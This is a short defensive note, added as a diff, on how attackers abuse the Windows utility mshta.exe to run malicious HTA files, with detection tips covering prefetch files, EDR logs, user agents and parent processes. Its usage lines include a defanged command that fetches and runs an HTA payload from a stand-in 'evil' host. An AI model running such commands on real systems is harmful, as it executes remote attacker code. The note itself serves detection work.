@@ -1,0 +1,15 @@
+HTML Application Files (HTA) files is basically a desktop application which is based on HTML format. HTA dynamics are done via java scripting 
+or VB scripts. Malicious codes can be in HTA formats to evade detections.MSHTA.exe is a Windows utility to execute HTA files.
+Adversaries use his utilities to execute the malicious HTA files.
+
+Usage  :
+mshta.exe https[:]//evil/evil[.]hta
+mshta evil[.]hta
+
+Detection:
+1.Look for MSHTA.exe prefetch files and Parsing the prefetch will provide the executed file. 
+2.Command execution and arguments passed to mshta.exe using EDR solutions.
+3.Look for the HTTP useragents with mshta in the network recorders or the proxy logs.
+4.Look for suspicious process in the system with parent process as MSHTA.
+
+
